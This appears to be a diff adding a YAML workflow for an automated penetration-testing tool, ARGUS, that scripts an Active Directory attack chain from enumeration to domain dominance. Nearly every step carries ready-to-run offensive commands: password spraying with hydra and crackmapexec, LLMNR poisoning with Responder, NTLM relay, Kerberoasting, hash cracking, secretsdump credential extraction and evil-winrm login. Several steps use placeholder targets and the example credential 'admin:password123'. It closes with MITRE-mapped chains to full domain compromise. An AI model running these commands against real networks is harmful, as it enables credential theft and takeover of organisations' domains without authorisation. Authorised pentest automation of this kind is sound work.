@@ -1,0 +1,159 @@
+description: >-
+  Active Directory attack workflow for ARGUS. Covers the AD attack kill chain
+  from enumeration through domain dominance, based on common internal pentest
+  attack paths.
+
+target_type: ad_environment
+phases: [recon, exploitation, post_exploitation]
+
+attack_phases:
+
+  - phase: "AD Enumeration (Recon)"
+    steps:
+      - order: 1
+        action: "Initial domain enumeration"
+        tools: [crackmapexec, smbmap, enum4linux_ng, ldapsearch]
+        commands:
+          - "crackmapexec smb 10.10.1.0/24"
+          - "smbmap -H 10.10.1.100 -u anonymous -p '' "
+          - "enum4linux-ng -A 10.10.1.100"
+          - "ldapsearch -x -H ldap://10.10.1.100 -b 'dc=domain,dc=local' '(objectClass=user)' sAMAccountName mail"
+        verification: "Domain name, users, groups, shares, and policies identified"
+        cwe_ids: [200, 287]
+        next_steps: [2]
+
+      - order: 2
+        action: "Kerberos enumeration"
+        tools: [kerbrute]
+        commands:
+          - "kerbrute userenum -d domain.local --dc 10.10.1.100 /in/users.txt"
+        verification: "Valid domain usernames discovered"
+        cwe_ids: [287]
+        next_steps: [3]
+
+      - order: 3
+        action: "BloodHound data collection"
+        tools: [bloodhound_python]
+        commands:
+          - "bloodhound-python -d domain.local -u admin -p password123 -ns 10.10.1.100 -c All"
+        verification: "Complete AD topology data for BloodHound analysis"
+        next_steps: [4]
+
+  - phase: "Credential Attacks (Exploitation)"
+    steps:
+      - order: 1
+        action: "Password spraying"
+        tools: [hydra, crackmapexec]
+        commands:
+          - "hydra -L /in/users.txt -P /in/pass.txt -t 4 -I -f smb://10.10.1.100"
+          - "crackmapexec smb 10.10.1.0/24 -u /in/users.txt -p /in/pass.txt --continue-on-success"
+        verification: "Valid credentials found"
+        cwe_ids: [287, 307]
+        next_steps: [2, 3]
+
+      - order: 2
+        action: "LLMNR/NBT-NS poisoning"
+        tools: [responder]
+        commands:
+          - "responder -I eth0 -wrf"
+        verification: "Captured NTLM hashes from poisoned requests"
+        cwe_ids: [287, 319]
+        next_steps: [4]
+
+      - order: 3
+        action: "NTLM relay attacks"
+        tools: [ntlmrelayx]
+        commands:
+          - "ntlmrelayx -t smb://10.10.1.100 -smb2support"
+        verification: "Relayed authentication to target"
+        cwe_ids: [287, 319]
+        next_steps: [4]
+
+      - order: 4
+        action: "Kerberoasting"
+        tools: [impacket_examples]
+        commands:
+          - "impacket-getUserSPNs domain.local/admin:password123 -request"
+        verification: "Service principal name hashes extracted for cracking"
+        cwe_ids: [287]
+        next_steps: [5]
+
+  - phase: "Lateral Movement and Privilege Escalation (Post-Exploitation)"
+    steps:
+      - order: 1
+        action: "Hash cracking and credential reuse"
+        tools: [hashcat, john, crackmapexec]
+        commands:
+          - "hashcat -m 1000 /in/ntlm_hashes.txt /in/wordlist.txt"
+          - "crackmapexec smb 10.10.1.0/24 -u admin -p password123 --continue-on-success"
+        verification: "Cracked hashes, validated credentials across network"
+        cwe_ids: [287, 521]
+        next_steps: [2]
+
+      - order: 2
+        action: "SAM database extraction and secret dump"
+        tools: [impacket_secretsdump, crackmapexec]
+        commands:
+          - "impacket-secretsdump domain.local/admin:password123@10.10.1.100"
+          - "crackmapexec smb 10.10.1.100 -u admin -p password123 --sam"
+        verification: "Full credential dump from target"
+        cwe_ids: [287, 521]
+        next_steps: [3]
+
+      - order: 3
+        action: "Domain dominance"
+        tools: [evil_winrm, impacket_examples, crackmapexec]
+        commands:
+          - "evil-winrm -i 10.10.1.100 -u admin -p password123"
+        verification: "Domain admin access established"
+        cwe_ids: [287]
+        next_steps: [4]
+
+      - order: 4
+        action: "Evidence collection"
+        tools: [puppeteer_screens]
+        verification: "Visual evidence of all attack steps captured"
+        next_steps: []
+
+common_attack_chains:
+  - name: "Null Session to Domain Admin"
+    likelihood: "medium"
+    steps:
+      - step: 1
+        technique: "T1087"
+        description: "Enumerate domain users via SMB null session"
+        from_finding: "SMB null session access"
+      - step: 2
+        technique: "T1110"
+        description: "Password spray discovered users"
+        from_finding: "Weak password policy"
+      - step: 3
+        technique: "T1075"
+        description: "Pass-the-hash to domain controller"
+        from_finding: "NTLM hash from credential dump"
+      - step: 4
+        technique: "T1484"
+        description: "Domain admin via DCSync or GPO modification"
+        from_finding: "Domain admin credentials obtained"
+    impact: "Full domain compromise"
+
+  - name: "Kerberoasting to Domain Admin"
+    likelihood: "high"
+    steps:
+      - step: 1
+        technique: "T1208"
+        description: "Request service tickets for SPNs"
+        from_finding: "Service accounts with SPNs"
+      - step: 2
+        technique: "T1110"
+        description: "Offline cracking of service ticket hashes"
+        from_finding: "Weak service account password"
+      - step: 3
+        technique: "T1078"
+        description: "Access as service account"
+        from_finding: "Service account with local admin rights"
+      - step: 4
+        technique: "T1007"
+        description: "BloodHound path to domain admin"
+        from_finding: "Local admin to domain admin path"
+    impact: "Domain dominance via service account"
